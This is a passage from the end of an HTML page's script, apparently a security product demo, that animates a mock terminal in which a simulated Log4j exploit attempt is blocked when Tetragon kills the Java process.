            await new Promise(r => setTimeout(r, 1000));
            term.innerHTML += `<div class="output-text">Log4j parsing string... initiating LDAP callback.</div>`;
            await new Promise(r => setTimeout(r, 800));
            term.innerHTML += `<div><span class="alert-text">VIRTUAL-PATCH</span> <span style="color: var(--cisco-orange);">Java process attempted fork /usr/bin/whoami</span></div>`;
            await new Promise(r => setTimeout(r, 600));
            term.innerHTML += `<div><span class="alert-text">SIGKILL</span> <span style="color: #ff5f56;">Tetragon killed Java PID 550 based on TracingPolicy 'block-java-fork'.</span></div>`;
            term.innerHTML += `<div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>`;
            btn.disabled = false;
        }
    </script>
</body>
</html>